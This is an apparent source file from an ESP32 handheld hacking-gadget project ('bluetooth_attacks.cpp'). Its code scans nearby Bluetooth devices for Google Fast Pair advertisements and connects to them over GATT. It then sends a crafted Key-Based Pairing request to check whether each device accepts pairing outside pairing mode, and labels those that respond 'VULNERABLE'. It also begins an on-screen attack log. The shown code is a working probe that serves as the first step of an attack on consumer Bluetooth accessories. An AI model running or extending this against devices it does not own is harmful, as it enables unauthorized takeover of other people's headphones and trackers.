rgomez31UAQ/ESP32-DIV_CYD-Gadget/bluetooth_attacks.cpp
// ─── Scan ────────────────────────────────────────────────────────────────
static void wpDoScan() {
    wpCount = 0;
    wpCurIdx = 0;
    wpListStart = 0;

    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 88);
    tft.print("[*] FAST PAIR SCAN ACTIVE");
    tft.drawLine(10, 98, 200, 98, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 108);
    tft.print("Hunting targets...");
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(10, 128);
    tft.print("Scan duration: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(WP_SCAN_SECS);
    tft.print("s");

    BLEScanResults results = pWpScan->start(WP_SCAN_SECS, false);

    int total = results.getCount();
    #if CYD_DEBUG
    Serial.printf("[WP] Scan got %d total BLE devices\n", total);
    #endif

    for (int i = 0; i < total && wpCount < WP_MAX_DEVICES; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);
        if (!device.haveServiceData()) continue;

        BLEUUID sdUUID = device.getServiceDataUUID();
        if (!sdUUID.equals(BLEUUID((uint16_t)0xFE2C))) continue;

        std::string sd = device.getServiceData();
        if (sd.length() < 3) continue;

        // Check duplicate MAC
        String addr = String(device.getAddress().toString().c_str());
        bool dup = false;
        for (int j = 0; j < wpCount; j++) {
            if (addr.equals(wpDevs[j].addrStr)) { dup = true; break; }
        }
        if (dup) continue;

        FPDevice& d = wpDevs[wpCount];
        strncpy(d.addrStr, addr.c_str(), 17);
        d.addrStr[17] = '\0';
        d.addrType = device.getAddressType();
        d.rssi = device.getRSSI();
        d.result = WPR_NONE;

        // Extract model ID (3 bytes big-endian)
        d.modelId = ((uint32_t)(uint8_t)sd[0] << 16) |
                    ((uint32_t)(uint8_t)sd[1] << 8)  |
                    (uint8_t)sd[2];

        const char* known = wpLookupModel(d.modelId);
        if (known) {
            strncpy(d.name, known, 23);
        } else if (device.getName().length() > 0) {
            strncpy(d.name, device.getName().c_str(), 23);
        } else {
            snprintf(d.name, 24, "FP:%06X", d.modelId);
        }
        d.name[23] = '\0';

        wpCount++;

        #if CYD_DEBUG
        Serial.printf("[WP] FP device: %s [%s] RSSI:%d Model:0x%06X\n",
                      d.name, d.addrStr, d.rssi, d.modelId);
        #endif
    }

    wpDrawList();
}

// ─── GATT Probe ──────────────────────────────────────────────────────────
static void wpProbeDevice(int idx) {
    wpProbeIdx = idx;
    inResult = false;
    FPDevice& d = wpDevs[idx];
    wpNotifRx = false;
    d.result = WPR_UNREACHABLE;

    // Stop scan before GATT client operations
    if (pWpScan) pWpScan->stop();

    // Draw probe UI
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("[*] PROBING TARGET");
    tft.drawLine(5, 94, 180, 94, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 100);
    tft.print(d.name);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(10, 115);
    tft.print(d.addrStr);

    // Create or reuse GATT client
    if (!pWpClient) {
        pWpClient = BLEDevice::createClient();
        if (!pWpClient) {
            #if CYD_DEBUG
            Serial.println("[WP] Failed to create BLE client");
            #endif
            inResult = true;
            wpDrawResult();
            return;
        }
    }

    // Attempt GATT connection
    wpDrawProbeStatus(0, "Connecting...", HALEHOUND_HOTPINK);
    BLEAddress addr(d.addrStr);
    bool connected = pWpClient->connect(addr, d.addrType);

    if (!connected) {
        #if CYD_DEBUG
        Serial.printf("[WP] GATT connect failed: %s\n", d.addrStr);
        #endif
        inResult = true;
        wpDrawResult();
        return;
    }

    wpDrawProbeStatus(0, "Connected!", HALEHOUND_MAGENTA);
    #if CYD_DEBUG
    Serial.printf("[WP] Connected to %s\n", d.addrStr);
    #endif

    // Discover Fast Pair service (try 128-bit then 16-bit UUID)
    wpDrawProbeStatus(1, "Finding FP service...", HALEHOUND_HOTPINK);
    BLERemoteService* pSvc = pWpClient->getService(wpFpUUID128);
    if (!pSvc) {
        pSvc = pWpClient->getService(wpFpUUID16);
    }

    if (!pSvc) {
        d.result = WPR_NO_SERVICE;
        pWpClient->disconnect();
        #if CYD_DEBUG
        Serial.println("[WP] Fast Pair service not found");
        #endif
        inResult = true;
        wpDrawResult();
        return;
    }

    wpDrawProbeStatus(1, "FP Service FOUND!", HALEHOUND_MAGENTA);
    delay(200);

    // Find Key-Based Pairing characteristic
    wpDrawProbeStatus(2, "Finding KBP char...", HALEHOUND_HOTPINK);
    BLERemoteCharacteristic* pKbp = pSvc->getCharacteristic(wpKbpUUID);

    if (!pKbp) {
        d.result = WPR_NO_CHAR;
        pWpClient->disconnect();
        #if CYD_DEBUG
        Serial.println("[WP] KBP char not found — device appears patched");
        #endif
        inResult = true;
        wpDrawResult();
        return;
    }

    // KBP characteristic accessible outside pairing mode!
    wpDrawProbeStatus(2, "KBP Char FOUND!", HALEHOUND_HOTPINK);
    d.result = WPR_EXPOSED;

    #if CYD_DEBUG
    Serial.println("[WP] KBP characteristic accessible outside pairing mode!");
    #endif

    // Subscribe to notifications
    if (pKbp->canNotify()) {
        pKbp->registerForNotify(wpNotifyCb);
        delay(100);
    }

    // Write test KBP request (16 bytes)
    // Byte 0: Message type (0x00 = Key-Based Pairing Request)
    // Byte 1: Flags (0x40 = request provider BR/EDR address)
    // Bytes 4-9: Target BLE address from advertisement
    // Bytes 10-15: Random salt
    wpDrawProbeStatus(3, "Sending KBP request...", HALEHOUND_HOTPINK);

    uint8_t kbpReq[16];
    kbpReq[0] = 0x00;  // KBP Request message type
    kbpReq[1] = 0x40;  // Flags
    kbpReq[2] = 0x00;
    kbpReq[3] = 0x00;
    for (int i = 4; i < 16; i++) kbpReq[i] = (uint8_t)random(256);

    // Parse target address into request bytes 4-9
    uint8_t addrBytes[6];
    sscanf(d.addrStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &addrBytes[0], &addrBytes[1], &addrBytes[2],
           &addrBytes[3], &addrBytes[4], &addrBytes[5]);
    memcpy(&kbpReq[4], addrBytes, 6);

    // Write the request (try write-with-response first)
    if (pKbp->canWrite()) {
        pKbp->writeValue(kbpReq, 16, true);
    } else {
        pKbp->writeValue(kbpReq, 16, false);
    }

    // Wait up to 3 seconds for notification response
    wpDrawProbeStatus(3, "Waiting for response...", HALEHOUND_HOTPINK);
    unsigned long t0 = millis();
    while (millis() - t0 < 3000 && !wpNotifRx) {
        delay(50);
    }

    if (wpNotifRx) {
        d.result = WPR_VULNERABLE;
        wpDrawProbeStatus(3, "RESPONSE RECEIVED!", 0xF800);
        delay(500);
        #if CYD_DEBUG
        Serial.println("[WP] VULNERABLE — responded to KBP outside pairing mode!");
        #endif
    }

    // Disconnect
    pWpClient->disconnect();

    inResult = true;
    wpDrawResult();
}

// ─── Attack Log ──────────────────────────────────────────────────────────
static void wpAtkAddLog(const char* msg, uint16_t color) {
    if (wpAtkLogCount < WP_ATK_LOG_LINES) {
        strncpy(wpAtkLog[wpAtkLogCount], msg, WP_ATK_LOG_WIDTH - 1);
        wpAtkLog[wpAtkLogCount][WP_ATK_LOG_WIDTH - 1] = '\0';
        wpAtkLogColors[wpAtkLogCount] = color;
        wpAtkLogCount++;
    } else {
        for (int i = 0; i < WP_ATK_LOG_LINES - 1; i++) {
            memcpy(wpAtkLog[i], wpAtkLog[i + 1], WP_ATK_LOG_WIDTH);
            wpAtkLogColors[i] = wpAtkLogColors[i + 1];
        }
        strncpy(wpAtkLog[WP_ATK_LOG_LINES - 1], msg, WP_ATK_LOG_WIDTH - 1);
        wpAtkLog[WP_ATK_LOG_LINES - 1][WP_ATK_LOG_WIDTH - 1] = '\0';
        wpAtkLogColors[WP_ATK_LOG_LINES - 1] = color;
    }
}

static void wpDrawAtkLog() {
    int startY = 98;
    int lineH = 15;
    int drawCount = (wpAtkLogCount < WP_ATK_LOG_LINES) ? wpAtkLogCount : WP_ATK_LOG_LINES;
    tft.fillRect(0, startY, SCREEN_WIDTH, WP_ATK_LOG_LINES * lineH, HALEHOUND_BLACK);
    for (int i = 0; i < drawCount; i++) {
        tft.setTextColor(wpAtkLogColors[i]);
        tft.setCursor(5, startY + i * lineH);
        tft.print(wpAtkLog[i]);
    }
}

